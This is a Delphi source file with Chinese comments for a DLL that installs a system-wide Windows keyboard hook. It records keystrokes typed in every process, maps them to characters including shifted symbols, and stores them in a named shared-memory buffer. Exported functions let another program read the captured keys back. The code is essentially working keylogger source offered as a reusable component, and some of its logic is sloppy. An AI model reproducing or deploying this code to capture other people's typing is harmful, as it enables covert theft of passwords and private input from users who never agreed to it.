unit U_HookDLL;

interface

uses
  Windows, Messages;

const BUFFER_SIZE = 16 * 1024;              //文件映射到内存的大小
const HOOK_MEM_FILENAME = 'MEM_FILE';       //映像文件名称
const HOOK_MUTEX_NAME = 'MUTEX_NAME';       //互斥名称

type
  //共享数据结构
  TShared = record
    Keys: array[0..BUFFER_SIZE - 1] of Char;
    KeyCount: Integer;
  end;
  //共享数据结构指针
  PShared = ^TShared;

var
  MemFile, HookMutex: THandle;              //文件句柄和互斥句柄
  hOldKeyHook: HHook;                       //钩子变量
  Shared: PShared;                          //共享变量

implementation

//键盘钩子回调函数
function KeyHookProc(iCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT;
  stdcall; export;
const
  KeyMask = $80000000;
var
  PEvt: ^EventMsg;
  vKey: Integer;
  iCapsLock, iNumLock, iShift: Integer;
  bCapsLock, bNumLock, bShift: Boolean;
begin
  if iCode < 0 then
    Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam)
  else
  begin
    if (iCode = HC_ACTION) then
    begin
      //将lParam指针传递给PEvt事件消息指针
      PEvt := Pointer(DWord(lParam));

      //键盘上有按键被压下
      if (PEvt.Message = WM_KEYDOWN) then
      begin
        //取得16进制数低字节内容
        vKey := LoByte(PEvt.paramL);
        //获取Shift键的状态
        iShift := GetKeyState(VK_SHIFT);
        //获取CapsLock键的状态
        iCapsLock := GetKeyState(VK_CAPITAL);
        //获取NumLock键的状态
        iNumLock := GEtKeyState(VK_NUMLOCK);
        //Shift键是否被按下
        bShift := ((iShift and KeyMask) = KeyMask);
        //CapsLock键是否被按下
        bCapsLock := (iCapsLock = 1);
        //NumLock键是否被按下
        bNumLock := (iNumLock = 1);
      end;

      //Number: 0..9
      if ((vKey >= 48) and (vKey <= 57)) then
      begin
        if (not bShift) then
        begin
          Shared^.Keys[Shared^.KeyCount] := Char(vKey);
          Inc(Shared^.KeyCount);
          //达到缓冲区容量限制时重置
          if Shared^.KeyCount >= BUFFER_SIZE - 1 then
            Shared^.KeyCount := 0;
        end
        else
        begin
          case vKey of
            48:
            begin
              Shared^.Keys[Shared^.KeyCount] := ')';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            49:
            begin
              Shared^.Keys[Shared^.KeyCount] := '!';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            50:
            begin
              Shared^.Keys[Shared^.KeyCount] := '@';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            51:
            begin
              Shared^.Keys[Shared^.KeyCount] := '#';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            52:
            begin
              Shared^.Keys[Shared^.KeyCount] := '$';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            53:
            begin
              Shared^.Keys[Shared^.KeyCount] := '%';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            54:
            begin
              Shared^.Keys[Shared^.KeyCount] := '^';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            55:
            begin
              Shared^.Keys[Shared^.KeyCount] := '&';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            56:
            begin
              Shared^.Keys[Shared^.KeyCount] := '*';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            57:
            begin
              Shared^.Keys[Shared^.KeyCount] := '(';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          end;
        end
      end;

      if ((vKey >= 65) and (vKey <= 90)) then
      begin
        //未按下CapsLock键
        if (not bCapsLock) then
        begin
          //已按下Shift键
          if (bShift) then
          begin
            Shared^.Keys[Shared^.KeyCount] := Char(vKey);
            Inc(Shared^.KeyCount);
            //达到缓冲区容量限制时重置
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end
          else
          begin
            Shared^.Keys[Shared^.KeyCount] := Char(vKey + 32);
            Inc(Shared^.KeyCount);
            //达到缓冲区容量限制时重置
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end
        end
        //已按下CapsLock键
        else
        begin
          //已按下Shift键
          if (bShift) then
          begin
            Shared^.Keys[Shared^.KeyCount] := Char(vKey + 32);
            Inc(Shared^.KeyCount);
            //达到缓冲区容量限制时重置
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end
          else
          begin
            Shared^.Keys[Shared^.KeyCount] := Char(vKey);
            Inc(Shared^.KeyCount);
            //达到缓冲区容量限制时重置
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end
        end;
      end;

      //小键盘的0..9
      if ((vKey >= 96) and (vKey <= 105)) then
        if bNumLock then
        begin
          Shared^.Keys[Shared^.KeyCount] := Char(vKey - 96 + 48);
          Inc(Shared^.KeyCount);
          //达到缓冲区容量限制时重置
          if Shared^.KeyCount >= BUFFER_SIZE - 1 then
            Shared^.KeyCount := 0;
        end;

      //+-*/
      if ((vKey >= 105) and (vKey <= 111)) then
      begin
        case vKey of
          106:
          begin
            Shared^.Keys[Shared^.KeyCount] := '*';
            Inc(Shared^.KeyCount);
            //达到缓冲区容量限制时重置
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end;
          107:
          begin
            Shared^.Keys[Shared^.KeyCount] := '+';
            Inc(Shared^.KeyCount);
            //达到缓冲区容量限制时重置
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end;
          109:
          begin
            Shared^.Keys[Shared^.KeyCount] := '-';
            Inc(Shared^.KeyCount);
            //达到缓冲区容量限制时重置
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end;
          111:
          begin
            Shared^.Keys[Shared^.KeyCount] := '/';
            Inc(Shared^.KeyCount);
            //达到缓冲区容量限制时重置
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end;
        end;
      end;

      //特殊符号
      if ((vKey >= 186) and (vKey <= 222)) then
      begin
        //若未按下Shift键
        if (not bShift) then
        begin
          case vKey of
            186:
            begin
              Shared^.Keys[Shared^.KeyCount] := ';';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            187:
            begin
              Shared^.Keys[Shared^.KeyCount] := '=';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            189:
            begin
              Shared^.Keys[Shared^.KeyCount] := ',';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            190:
            begin
              Shared^.Keys[Shared^.KeyCount] := '.';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            191:
            begin
              Shared^.Keys[Shared^.KeyCount] := '/';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            192:
            begin
              Shared^.Keys[Shared^.KeyCount] := '''';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            219:
            begin
              Shared^.Keys[Shared^.KeyCount] := '[';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            220:
            begin
              Shared^.Keys[Shared^.KeyCount] := '\';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            221:
            begin
              Shared^.Keys[Shared^.KeyCount] := ']';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            222:
            begin
              Shared^.Keys[Shared^.KeyCount] := Char(27);
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          end;
        end
        else
        begin
          case vKey of
            186:
            begin
              Shared^.Keys[Shared^.KeyCount] := ':';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            187:
            begin
              Shared^.Keys[Shared^.KeyCount] := '+';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            189:
            begin
              Shared^.Keys[Shared^.KeyCount] := '<';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            190:
            begin
              Shared^.Keys[Shared^.KeyCount] := '>';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            191:
            begin
              Shared^.Keys[Shared^.KeyCount] := '?';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            192:
            begin
              Shared^.Keys[Shared^.KeyCount] := '~';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            219:
            begin
              Shared^.Keys[Shared^.KeyCount] := '{';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            220:
            begin
              Shared^.Keys[Shared^.KeyCount] := '|';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            221:
            begin
              Shared^.Keys[Shared^.KeyCount] := '}';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            222:
            begin
              Shared^.Keys[Shared^.KeyCount] := '"';
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          end;
        end;
      end;

      if ((vKey >= 8) and (vKey <= 46)) then
      begin
        case vKey of
          8:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[BACK]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          9:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[TAB]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          13:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[ENTER]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          32:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[SPACE]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          35:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[END]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          36:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[HOME]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          37:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[LF]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          38:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[UF]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          39:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[RF]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          40:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[DF]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          45:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[INSERT]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          46:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[DELETE]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //达到缓冲区容量限制时重置
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
        end;
      end;

      {
      if ((lParam and KeyMask) = 0) then
      begin
        //捕获键盘消息
        Shared^.Keys[Shared^.KeyCount] := Char(wParam and $00FF);
        Inc(Shared^.KeyCount);
        //达到缓冲区容量限制时重置
        if Shared^.KeyCount >= BUFFER_SIZE - 1 then
          Shared^.KeyCount := 0;
      end;
      }
    end;

    Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam);
  end;
end;

//安装键盘钩子
function EnableKeyHook: BOOL; export;
begin
  Shared^.KeyCount := 0;

  if hOldKeyHook = 0 then
  begin
    //WH_KEYBOARD:键盘钩子, KeyHookProc:回调函数, HInstance:回调函数实例, 线程ID
    hOldKeyHook := SetWindowsHookEx(WH_KEYBOARD, KeyHookProc, HInstance, 0);
  end;

  Result := (hOldKeyHook <> 0);
end;

{卸载键盘钩子}
function DisableKeyHook: BOOL; export;
begin
  if hOldKeyHook <> 0 then
  begin
    UnHookWindowsHookEx(hOldKeyHook);
    hOldKeyHook := 0;
    Shared^.KeyCount := 0;
  end;

  Result := (hOldKeyHook = 0);
end;

//返回捕获的按键个数
function GetKeyCount: Integer; export;
begin
  Result := Shared^.KeyCount;
end;

//返回指定按键
function GetKey(Index: Integer): Char; export;
begin
  Result := Shared^.Keys[Index];
end;

//清空存放按键的缓冲区
procedure ClearKeyString; export;
begin
  Shared^.KeyCount := 0;
end;

//导出函数列表
exports
  EnableKeyHook,
  DisableKeyHook,
  GetKeyCount,
  ClearKeyString,
  GetKey;

initialization
  //创建互斥变量, 只允许一个进程使用此DLL
  HookMutex := CreateMutex(nil, True, HOOK_MUTEX_NAME);

  //打开文件映像
  MemFile := OpenFileMapping(FILE_MAP_WRITE, False, HOOK_MEM_FILENAME);

  //如果不存在该文件映像则重新创建
  if MemFile = 0 then
    MemFile := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0,
      SizeOf(TShared), HOOK_MEM_FILENAME);

  //文件映射内存
  Shared := MapViewOfFile(MemFile, File_MAP_WRITE, 0, 0, 0);

  //释放互斥变量
  ReleaseMutex(HookMutex);

  //关闭互斥句柄
  CloseHandle(HookMutex);

finalization
  //卸载键盘钩子
  if hOldKeyHook <> 0 then
    DisableKeyHook;

  //释放映射
  UnMapViewOfFile(Shared);

  //关闭映像文件句柄
  CloseHandle(MemFile);

end.